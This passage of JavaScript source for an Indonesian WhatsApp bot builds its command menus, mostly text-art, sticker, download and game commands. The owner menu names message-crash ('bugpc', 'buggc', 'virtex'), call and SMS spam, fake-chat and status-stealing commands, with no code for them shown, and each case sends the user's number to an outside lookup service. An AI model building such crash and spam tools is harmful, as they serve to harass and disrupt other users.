│• ${prefix}hologram3d <teks>
│• ${prefix}greenneon <teks>
│• ${prefix}glossychrome <teks>
│• ${prefix}greenbush <teks>
│• ${prefix}metallogo <teks>
│• ${prefix}noeltext <teks>
│• ${prefix}glittergold <teks>
│• ${prefix}textcake <teks>
│• ${prefix}starsnight <teks>
│• ${prefix}wooden3d <teks>
│• ${prefix}textbyname <teks>
│• ${prefix}writegalacy <teks>
│• ${prefix}galaxybat <teks>
│• ${prefix}snow3d <teks>
│• ${prefix}birthdayday <teks>
│• ${prefix}goldplaybutton <teks>
│• ${prefix}silverplaybutton <teks>
│• ${prefix}freefire <teks>
│• ${prefix}shadow <teks>
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakemeki}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'tools':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *TOOLS* ]
│• ${prefix}nulis <teks>
│• ${prefix}sticker
│• ${prefix}stickerwm <nama|author>
│• ${prefix}dadu
│• ${prefix}semoji <emoji>
│• ${prefix}attp <teks>
│• ${prefix}ttp <teks>
│• ${prefix}ttp2 <teks>
│• ${prefix}ttp3 <teks>
│• ${prefix}ttp4 <teks>
│• ${prefix}toimg (reply img)
│• ${prefix}tomp3 <reply video>
│• ${prefix}tomp4 <reply sticker gif>
│• ${prefix}robot <reply audio>
│• ${prefix}balik <reply audio>
│• ${prefix}bass <reply audio>
│• ${prefix}gemuk <reply audio>
│• ${prefix}detikvn <reply audio caption angka>
│• ${prefix}detikvideo <reply video caption angka>
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakejem}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'text':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *TEXTMAKER* ]
│• ${prefix}fancytext <teks>
│• ${prefix}emoji <emojinya>
│• ${prefix}halloween <teks>
│• ${prefix}vampire <teks>
│• ${prefix}codetxt <teks>
│• ${prefix}matrix <teks>
│• ${prefix}googletxt <teks>
│• ${prefix}spiderman <teks>
│• ${prefix}express
│• ${prefix}maker2d2 <teks>
│• ${prefix}maker2d3 <teks>
│• ${prefix}maker2d4 <teks>
│• ${prefix}maker3d <teks>
│• ${prefix}golden <teks>
│• ${prefix}flower <teks>
│• ${prefix}dance
│• ${prefix}wooden <teks>
│• ${prefix}burn <teks>
│• ${prefix}glow <teks>
│• ${prefix}summer <teks>
│• ${prefix}neon <teks>
│• ${prefix}coffeecup2 <teks>
│• ${prefix}coffeecup <teks>
│• ${prefix}battlefield <teks|teks>
│• ${prefix}googletxt2 <teks>
│• ${prefix}transformer <teks>
│• ${prefix}nulis <teks>
│• ${prefix}text3d <teks>
│• ${prefix}warrior <teks>
│• ${prefix}blackpink <teks>
│• ${prefix}neon <teks>
│• ${prefix}greenneon <teks>
│• ${prefix}advanceglow <teks>
│• ${prefix}futureneon <teks>
│• ${prefix}sandwriting <teks>
│• ${prefix}sandsummer <teks>
│• ${prefix}sandengraved <teks>
│• ${prefix}metaldark <teks>
│• ${prefix}neonlight <teks>
│• ${prefix}holographic <teks>
│• ${prefix}text1917 <teks>
│• ${prefix}minion <teks>
│• ${prefix}deluxesilver <teks>
│• ${prefix}newyearcard <teks>
│• ${prefix}bloodfrosted <teks>
│• ${prefix}halloween <teks>
│• ${prefix}jokerlogo <teks>
│• ${prefix}fireworksparkle <teks>
│• ${prefix}natureleaves <teks>
│• ${prefix}bokeh <teks>
│• ${prefix}toxic <teks>
│• ${prefix}strawberry <teks>
│• ${prefix}box3d <teks>
│• ${prefix}roadwarning <teks>
│• ${prefix}breakwall <teks>
│• ${prefix}icecold <teks>
│• ${prefix}luxury <teks>
│• ${prefix}cloud <teks>
│• ${prefix}summersand <teks>
│• ${prefix}horrorblood <teks>
│• ${prefix}thunder <teks>
│• ${prefix}pornhub <teks>
│• ${prefix}glitch <teks>
│• ${prefix}avenger <teks>
│• ${prefix}space <teks>
│• ${prefix}ninjalogo <teks>
│• ${prefix}marvelstudio <teks>
│• ${prefix}lionlogo <teks>
│• ${prefix}wolflogo <teks>
│• ${prefix}steel3d <teks>
│• ${prefix}wallgravity <teks>
│• ${prefix}shadow <teks>
│• ${prefix}cup <teks>
│• ${prefix}cup1 <teks>
│• ${prefix}romance <teks>
│• ${prefix}smoke <teks>
│• ${prefix}burnpaper <teks>
│• ${prefix}lovemessage <teks>
│• ${prefix}undergrass <teks>
│• ${prefix}love <teks>
│• ${prefix}coffe <teks>
│• ${prefix}woodheart <teks>
│• ${prefix}woodenboard <teks>
│• ${prefix}summer3d <teks>
│• ${prefix}wolfmetal <teks>
│• ${prefix}nature3d <teks>
│• ${prefix}underwater <teks>
│• ${prefix}golderrose <teks>
│• ${prefix}summernature <teks>
│• ${prefix}letterleaves <teks>
│• ${prefix}glowingneon <teks>
│• ${prefix}fallleaves <teks>
│• ${prefix}flamming <teks>
│• ${prefix}harrypotter <teks>
│• ${prefix}carvedwood <teks>
│• ${prefix}arcade8bit <teks>
│• ${prefix}battlefield4 <teks>
│• ${prefix}pubg <teks>
│• ${prefix}wetglass <teks>
│• ${prefix}multicolor3d <teks>
│• ${prefix}watercolor <teks>
│• ${prefix}luxurygold <teks>
│• ${prefix}galaxywallpaper <teks>
│• ${prefix}lighttext <teks>
│• ${prefix}beautifulflower <teks>
│• ${prefix}puppycute <teks>
│• ${prefix}royaltext <teks>
│• ${prefix}heartshaped <teks>
│• ${prefix}birthdaycake <teks>
│• ${prefix}galaxystyle <teks>
│• ${prefix}hologram3d <teks>
│• ${prefix}greenneon <teks>
│• ${prefix}glossychrome <teks>
│• ${prefix}greenbush <teks>
│• ${prefix}metallogo <teks>
│• ${prefix}noeltext <teks>
│• ${prefix}glittergold <teks>
│• ${prefix}textcake <teks>
│• ${prefix}starsnight <teks>
│• ${prefix}wooden3d <teks>
│• ${prefix}textbyname <teks>
│• ${prefix}writegalacy <teks>
│• ${prefix}galaxybat <teks>
│• ${prefix}snow3d <teks>
│• ${prefix}birthdayday <teks>
│• ${prefix}goldplaybutton <teks>
│• ${prefix}silverplaybutton <teks>
│• ${prefix}freefire <teks>
│• ${prefix}shadow <teks> 
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakepeler}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'database':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
╭─[ *DATABASE* ]
│• ${prefix}tagme (@tag)
│• ${prefix}tts (kodebhs teks)
│• ${prefix}readmore (teks1|teks2)
│• ${prefix}fitnahpc (nomor|teks1|teks2)
│• ${prefix}chat (nomor|teks)
│• ${prefix}fdeface (replyimg link|teks1|teks2)
│• ${prefix}listimage
│• ${prefix}liststicker <teks>
│• ${prefix}listvn 
│• ${prefix}listgrup
│• ${prefix}baileys (reply message)
│• ${prefix}q (reply message)
│• ${prefix}getcaption (reply message)
│• ${prefix}pantun (limit)
│• ${prefix}tospam (reply audio/sticker/image|jumlah)
│• ${prefix}sharelock (teks1|teks2)
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakedatabase}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'photoxy':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *PHOTOXY* ]
│• ${prefix}shadow <teks>
│• ${prefix}cup <teks>
│• ${prefix}cup1 <teks>
│• ${prefix}romance <teks>
│• ${prefix}smoke <teks>
│• ${prefix}burnpaper <teks>
│• ${prefix}lovemessage <teks>
│• ${prefix}undergrass <teks>
│• ${prefix}love <teks>
│• ${prefix}coffe <teks>
│• ${prefix}woodheart <teks>
│• ${prefix}woodenboard <teks>
│• ${prefix}summer3d <teks>
│• ${prefix}wolfmetal <teks>
│• ${prefix}nature3d <teks>
│• ${prefix}underwater <teks>
│• ${prefix}golderrose <teks>
│• ${prefix}summernature <teks>
│• ${prefix}letterleaves <teks>
│• ${prefix}glowingneon <teks>
│• ${prefix}fallleaves <teks>
│• ${prefix}flamming <teks>
│• ${prefix}harrypotter <teks>
│• ${prefix}carvedwood <teks>
│• ${prefix}tiktok text1 text2
│• ${prefix}arcade8bit <teks>
│• ${prefix}battlefield4 <teks>
│• ${prefix}pubg <teks>
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakeoxy}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'game':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *GAME* ]
│• ${prefix}slot
│• ${prefix}tictactoe (@tag)
│• ${prefix}tebakgambar
│• ${prefix}suit (batu/kertas/gunting)
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakegeming}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'allmenu':        
case 'menuall':
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
janganti = '6289503657396'
kontol = '6285815700861'
totalChat = await itsmevall.chats.all()
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
thu = await itsmevall.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
menuh = `${ucapanWaktu} @${sender.split('@')[0]}`
itsmevall.sendMessage(from, { contentText: `${menuh}`, 
footerText: `*(OWNER)*
› ${prefix}off
› ${prefix}isbaileys
› ${prefix}banchat (on/off)
› ${prefix}unbanchat (on/off)
› ${prefix}listbc
› ${prefix}setcmd (reply sticker)
› ${prefix}delcmd (reply sticker)
› ${prefix}listcmd 
› ${prefix}restart
› ${prefix}antidelete (on|off)
› ${prefix}autoketik (on|off)
› ${prefix}autoread (gc in / gc off)
› ${prefix}autovn (on|off)
› ${prefix}anticall (on|off)
› ${prefix}getcaption (reply)
› ${prefix}bugkatalog
› ${prefix}buggc (id grup)
› ${prefix}bugpc (only pc)
› ${prefix}troliv1 (teks)
› ${prefix}troliv2 (total)
› ${prefix}tovirgam (reply img)
› ${prefix}virtex (total
› ${prefix}on
› ${prefix}cekapikey
› ${prefix}bcgc <teks>
› ${prefix}bc <teks>
› ${prefix}bc2 <teks>
› ${prefix}spamcall (no hp)
› ${prefix}spamsms (no hp)
› ${prefix}addprem (@user)
› ${prefix}delprem (@user)
› ${prefix}listprem
› ${prefix}status
› ${prefix}setthumb (reply img)
› ${prefix}settarget (+62)
› ${prefix}setfakeimg (reply img)
› ${prefix}setreply (reply img)
› ${prefix}hacked (nama)
› ${prefix}setprefix 
› ${prefix}mode </public-self/>
› ${prefix}term <code>
› ${prefix}eval <code>
› ${prefix}colongsw (reply sw)


(*XP & LIMIT)*
› ${prefix}buylimit (jumlah)
› ${prefix}levelup
› ${prefix}buyall
› ${prefix}claim
› ${prefix}limit


*(PREMIUM)*
› ${prefix}tiktoknowm (premium)
› ${prefix}ytmp4 (premium)
› ${prefix}playmp4 (premium)
› ${prefix}mediafire (premium)


*(GRUP)*
› ${prefix}grup (buka/tutup)
› ${prefix}promote (@tag)
› ${prefix}demote (@tag)
› ${prefix}setdesc
› ${prefix}setname (@tag)
› ${prefix}nsfw (1/0)
› ${prefix}kick (@tag)
› ${prefix}add (@+62)
› ${prefix}getbio (@tag)
› ${prefix}getname (@tag)
› ${prefix}reminder (@tag)
› ${prefix}listonline
› ${prefix}sider (reply pesan bot)
› ${prefix}antilink (on|off)
› ${prefix}tod (tantangan/kejujuran)
› ${prefix}tospam (jumlah)
› ${prefix}antihidetag (on|off)
› ${prefix}antiviewonce (on|off)
› ${prefix}antivirtex (on|off)
› ${prefix}autojoin (on|off)
› ${prefix}kickarea (on|off)


*(TOOLS)*
› ${prefix}nulis (kiri/kanan) <teks>
› ${prefix}telesticker <link> (limit)
› ${prefix}stcmeme <teks>|<teks> (limit)
› ${prefix}smeme (<teks> reply gambar) (limit)
› ${prefix}stickerwm <nama|author> (limit)
› ${prefix}semoji <emoji>
› ${prefix}attp <teks> (limit)
› ${prefix}attp2 <teks> (limit)
› ${prefix}ttp <teks> (limit)
› ${prefix}ttp2 <teks> (limit)
› ${prefix}ttp3 <teks> (limit)
› ${prefix}ttp4 <teks> (limit)


*(RANDOM TEXT)*
› ${prefix}randomquotes (limit)
› ${prefix}quoteskanye (limit)
› ${prefix}quotesislami (limit)
› ${prefix}quotesanime (limit)
› ${prefix}pantun (limit)
› ${prefix}puisi (limit)
› ${prefix}faktaunik (limit)
› ${prefix}katabijak (limit)
› ${prefix}katailham (limit)
› ${prefix}katasindiran (limit)
› ${prefix}katabucin (limit)
› ${prefix}katabucin2 (limit)


*(MAKER)*
› ${prefix}swm <author|packname> (limit)
› ${prefix}take <author|packname> (limit)
› ${prefix}fdeface <reply img / link> (limit)
› ${prefix}fancytext <teks>
› ${prefix}ktpmaker <teks>
› ${prefix}emoji <emojinya>
› ${prefix}halloween <teks>
› ${prefix}vampire <teks>
› ${prefix}codetxt <teks>
› ${prefix}matrix <teks>
› ${prefix}googletxt <teks>
› ${prefix}spiderman <teks>
› ${prefix}express
› ${prefix}maker2d2 <teks>
› ${prefix}maker2d3 <teks>
› ${prefix}maker2d4 <teks>
› ${prefix}maker3d <teks>
› ${prefix}golden <teks>
› ${prefix}flower <teks>
› ${prefix}dance
› ${prefix}wooden <teks>
› ${prefix}burn <teks>
› ${prefix}glow <teks>
› ${prefix}summer <teks>
› ${prefix}neon <teks>
› ${prefix}coffeecup2 <teks>
› ${prefix}coffeecup <teks>
› ${prefix}battlefield <teks|teks>
› ${prefix}googletxt2 <teks>
› ${prefix}transformer <teks>
› ${prefix}nulis <teks>
› ${prefix}text3d <teks>
› ${prefix}warrior <teks>
› ${prefix}blackpink <teks>
› ${prefix}neon <teks>
› ${prefix}greenneon <teks>
› ${prefix}advanceglow <teks>
› ${prefix}futureneon <teks>
› ${prefix}sandwriting <teks>
› ${prefix}sandsummer <teks>
› ${prefix}sandengraved <teks>
› ${prefix}metaldark <teks>
› ${prefix}neonlight <teks>
› ${prefix}holographic <teks>
› ${prefix}text1917 <teks>
› ${prefix}minion <teks>
› ${prefix}deluxesilver <teks>
› ${prefix}newyearcard <teks>
› ${prefix}bloodfrosted <teks>
› ${prefix}halloween <teks>
› ${prefix}jokerlogo <teks>
› ${prefix}fireworksparkle <teks>
› ${prefix}natureleaves <teks>
› ${prefix}bokeh <teks>
› ${prefix}toxic <teks>
› ${prefix}strawberry <teks>
› ${prefix}box3d <teks>
› ${prefix}roadwarning <teks>
› ${prefix}breakwall <teks>
› ${prefix}icecold <teks>
› ${prefix}luxury <teks>
› ${prefix}cloud <teks>
› ${prefix}summersand <teks>
› ${prefix}horrorblood <teks>
› ${prefix}thunder <teks>
› ${prefix}pornhub <teks>
› ${prefix}glitch <teks>
› ${prefix}avenger <teks>
› ${prefix}space <teks>
› ${prefix}ninjalogo <teks>
› ${prefix}marvelstudio <teks>
› ${prefix}lionlogo <teks>
› ${prefix}wolflogo <teks>
› ${prefix}steel3d <teks>
› ${prefix}wallgravity <teks>
› ${prefix}shadow <teks>
› ${prefix}cup <teks>
› ${prefix}cup1 <teks>
› ${prefix}romance <teks>
› ${prefix}smoke <teks>
› ${prefix}burnpaper <teks>
› ${prefix}lovemessage <teks>
› ${prefix}undergrass <teks>
› ${prefix}love <teks>
› ${prefix}coffe <teks>
› ${prefix}woodheart <teks>
› ${prefix}woodenboard <teks>
› ${prefix}summer3d <teks>
› ${prefix}wolfmetal <teks>
› ${prefix}nature3d <teks>
› ${prefix}underwater <teks>
› ${prefix}golderrose <teks>
› ${prefix}summernature <teks>
› ${prefix}letterleaves <teks>
› ${prefix}glowingneon <teks>
› ${prefix}fallleaves <teks>
› ${prefix}flamming <teks>
› ${prefix}harrypotter <teks>
› ${prefix}carvedwood <teks>
› ${prefix}arcade8bit <teks>
› ${prefix}battlefield4 <teks>
› ${prefix}pubg <teks>
› ${prefix}wetglass <teks>
› ${prefix}multicolor3d <teks>
› ${prefix}watercolor <teks>
› ${prefix}luxurygold <teks>
› ${prefix}galaxywallpaper <teks>
› ${prefix}lighttext <teks>
› ${prefix}beautifulflower <teks>
› ${prefix}puppycute <teks>
› ${prefix}royaltext <teks>
› ${prefix}heartshaped <teks>
› ${prefix}birthdaycake <teks>
› ${prefix}galaxystyle <teks>
› ${prefix}hologram3d <teks>
› ${prefix}greenneon <teks>
› ${prefix}glossychrome <teks>
› ${prefix}greenbush <teks>
› ${prefix}metallogo <teks>
› ${prefix}noeltext <teks>
› ${prefix}glittergold <teks>
› ${prefix}textcake <teks>
› ${prefix}starsnight <teks>
› ${prefix}wooden3d <teks>
› ${prefix}textbyname <teks>
› ${prefix}writegalacy <teks>
› ${prefix}galaxybat <teks>
› ${prefix}snow3d <teks>
› ${prefix}birthdayday <teks>
› ${prefix}goldplaybutton <teks>
› ${prefix}silverplaybutton <teks>
› ${prefix}freefire <teks>
› ${prefix}shadow <teks>
› ${prefix}halloween <teks>
› ${prefix}3dgradient <teks>
› ${prefix}naturalleaves <teks>
› ${prefix}dropwater <teks>
› ${prefix}blood <teks>
› ${prefix}blood2 <teks>
› ${prefix}neondevil <teks>
› ${prefix}neon <teks>
› ${prefix}neonlight <teks>
› ${prefix}neonlight2 <teks>
› ${prefix}neonlight3 <teks>
› ${prefix}greenneon <teks>
› ${prefix}toxic <teks>
› ${prefix}matrix <teks>
› ${prefix}thunder <teks>
› ${prefix}thunder2 <teks>
› ${prefix}bokeh <teks>
› ${prefix}carbontext <teks>
› ${prefix}christmas <teks>
› ${prefix}breakwall <teks>
› ${prefix}roadwarning <teks>
› ${prefix}engraved3d <teks>
› ${prefix}embossed <teks>
› ${prefix}writefoggy <teks>
› ${prefix}3dstone <teks>
› ${prefix}futuristic <teks>
› ${prefix}asketch <teks>
› ${prefix}bluecircuit <teks>
› ${prefix}space <teks>
› ${prefix}amagmahot <teks>
› ${prefix}artpapercut <teks>
› ${prefix}3dluxurygold <teks>
› ${prefix}robotr2d2 <teks>
› ${prefix}harrypotter <teks>
› ${prefix}glitch3 <teks>
› ${prefix}greenhorrorstyle <teks>
› ${prefix}3ddeepseametal <teks>
› ${prefix}leddisplayscreen <teks>
› ${prefix}wonderfulgraffitiart <teks>
› ${prefix}8bit <teks>1&<teks>2
› ${prefix}pornhub <teks>1&<teks>2
› ${prefix}glitch <teks>1&<teks>2
› ${prefix}glitch2 <teks>1&<teks>2
› ${prefix}layered <teks>1&<teks>2
› ${prefix}3dsteel <teks>1&<teks>2
› ${prefix}realistic <teks>1&<teks>2
› ${prefix}lionlogo <teks>1&<teks>2
› ${prefix}ninjalogo <teks>1&<teks>2
› ${prefix}wolf <teks>1&<teks>2
› ${prefix}wolf2 <teks>1&<teks>2
› ${prefix}halloween2 <teks>1&<teks>2
› ${prefix}marvel <teks>1&<teks>2
› ${prefix}marvel2 <teks>1&<teks>2
› ${prefix}cinematichorror <teks>1&<teks>2
› ${prefix}avengers <teks>1&<teks>2
› ${prefix}graffiti3 <teks>1&<teks>2
› ${prefix}captainamerica <teks>1&<teks>2
› ${prefix}girlneko <teks>1&<teks>2
› ${prefix}sadboy <teks>1&<teks>2
› ${prefix}kaneki <teks>1&<teks>2
› ${prefix}rem <teks>1&<teks>2
› ${prefix}lolimaker <teks>1&<teks>2
› ${prefix}gura <teks>1&<teks>2
› ${prefix}pipe <teks>
› ${prefix}horor <teks>
› ${prefix}nulis <teks>
› ${prefix}sirkuit <teks>
› ${prefix}discovery <teks>
› ${prefix}fiction <teks>
› ${prefix}demon <teks>
› ${prefix}transformer <teks>
› ${prefix}berry <teks>
› ${prefix}leyered <teks>
› ${prefix}magma <teks>
› ${prefix}stone <teks>
› ${prefix}neon3 <teks>
› ${prefix}broken <teks>
› ${prefix}nulis2 <teks>
› ${prefix}gradient <teks>
› ${prefix}glossy <teks>
› ${prefix}watercolor <teks>
› ${prefix}multicolor <teks>
› ${prefix}neondevil <teks>
› ${prefix}underwater <teks>
› ${prefix}bear <teks>
› ${prefix}glitter7 <teks>
› ${prefix}metale <teks>


*(CONVERT)*
› ${prefix}tomp3 (reply video) (limit)
› ${prefix}tomp4 (reply sticker) (limit)
› ${prefix}toimg (reply img)
› ${prefix}tovn (reply audio/vn) (limit)
› ${prefix}slow (reply audio/vn) (limit)
› ${prefix}fast (reply audio/vn) (limit)
› ${prefix}reverse (reply audio/vn) (limit)
› ${prefix}tourl (reply img) (limit)


*(DOWNLOADER)*
› ${prefix}play <query>
› ${prefix}ytmp4 <link> (limit)
› ${prefix}ytmp3 <link> (limit)
› ${prefix}video <query> (limit)
› ${prefix}instagram <link> (limit)
› ${prefix}twitter <link> (limit)
› ${prefix}facebook link (limit)
› ${prefix}joox <query> (limit)
› ${prefix}googledrive <link> (limit)
› ${prefix}tiktokdl <link> (limit)
› ${prefix}tiktokmusic <link> (limit)
› ${prefix}tiktokmusic2 <link> (limit)
› ${prefix}tiktokwm2 <link> (limit)
› ${prefix}tiktokbutton <link> (limit)
› ${prefix}ytsearch <query> (limit)
› ${prefix}igdl <link> (limit)
› ${prefix}igtv <link> (limit)
› ${prefix}fbdl <link> (limit)
› ${prefix}brainly <query> (limit)
› ${prefix}lirik <query> (limit)
› ${prefix}tiktoknowm <link> (limit)
› ${prefix}pinterest <query> (limit)
› ${prefix}spotifysearch <query> (limit)


*(TAG)*
› ${prefix}hidetag <teks>
› ${prefix}kontag (@tag)
› ${prefix}sticktag (reply sticker) (limit)
› ${prefix}totag (reply sticker) (limit)


*(IMAGE EFECT)*
› ${prefix}wanted (limit)
› ${prefix}fire (limit)
› ${prefix}scary (limit)
› ${prefix}instagramefect (limit)
› ${prefix}gay (limit)
› ${prefix}burn (limit)
› ${prefix}rip (limit)
› ${prefix}triggered (limit)


*(RANDOM IMAGE)*
› ${prefix}quotesimage (limit)
› ${prefix}renungan (limit)
› ${prefix}wallpaperhacker (limit)
› ${prefix}wallpaperharley (limit)
› ${prefix}wallpaperjoker (limit)
› ${prefix}wallpapermuslim (limit)
› ${prefix}wallpapercyberspace 
› ${prefix}wallpapermountain (limit)
› ${prefix}wallpaperprogramming (limit)
› ${prefix}wallpapertechnology (limit)


*(GAME)*
› ${prefix}slot
› ${prefix}tictactoe (@tag)
› ${prefix}tebakgambar
› ${prefix}tebakanime
› ${prefix}caklontong
› ${prefix}suit (batu/kertas/gunting)


*(HEWAN MENU)*
› ${prefix}fox
› ${prefix}dog
› ${prefix}cat
› ${prefix}panda
› ${prefix}panda1
› ${prefix}bird
› ${prefix}koala


*(SEARCHING)*
› ${prefix}kbbi <query> (limit)
› ${prefix}jarak <tempat|tempat> (limit)
› ${prefix}translate <teks> (limit)
› ${prefix}infogempa (limit)
› ${prefix}covidindo (limit)
› ${prefix}covidglobal (limit)
› ${prefix}wikipedia <query> (limit)
› ${prefix}playstore <query> (limit)
› ${prefix}wattpad (limit)
› ${prefix}newsinfo (limit)
› ${prefix}jadwaltv <query> (limit)
› ${prefix}cuaca (nama kota)
› ${prefix}google <query> (limit)
› ${prefix}googlesearch <query> (limit)
› ${prefix}gimage <query> (limit)
› ${prefix}wattpadsearch <query>
› ${prefix}carigc <query> (limit)
› ${prefix}shopee <query> (limit)
› ${prefix}drakorongoing <query> (limit)
› ${prefix}lk21 <query> (limit)


*(ABOUT)*
› ${prefix}owner
› ${prefix}sewabot
› ${prefix}report (masalah)
› ${prefix}runtime
› ${prefix}speed 
› ${prefix}sc
› ${prefix}rulesbot
› ${prefix}sharelock <teks> (limit)


*(UPSW)*
› ${prefix}upswteks <teks>
› ${prefix}upswlokasi
› ${prefix}upswsticker
› ${prefix}upswimage (reply img)
› ${prefix}upswvideo (reply video)
› ${prefix}upswgif (reply gif)


*(GACHA CECAN)*
› ${prefix}cogan (limit)
› ${prefix}cecan (limit)
› ${prefix}china (limit)
› ${prefix}vietnam (limit)
› ${prefix}thainlad (limit)
› ${prefix}indonesia (limit)
› ${prefix}korea (limit)
› ${prefix}japan (limit)
› ${prefix}malaysia (limit)


*(OTHER)*
› ${prefix}get <link> (limit)
› ${prefix}artinama (nama) (limit)
› ${prefix}jodoh (@tag)
› ${prefix}tebakumur
› ${prefix}weton (@tag)
› ${prefix}jadian (@tag)
› ${prefix}faktaunik <teks>
› ${prefix}anime <query> (limit)
› ${prefix}truth
› ${prefix}dare
› ${prefix}dadu
› ${prefix}tembak (udara) 
› ${prefix}tembak (laut)
› ${prefix}tembak (darat)
› ${prefix}slot
› ${prefix}quotes (limit)
› ${prefix}quotesanime (limit)
› ${prefix}quotesdilan (limit)
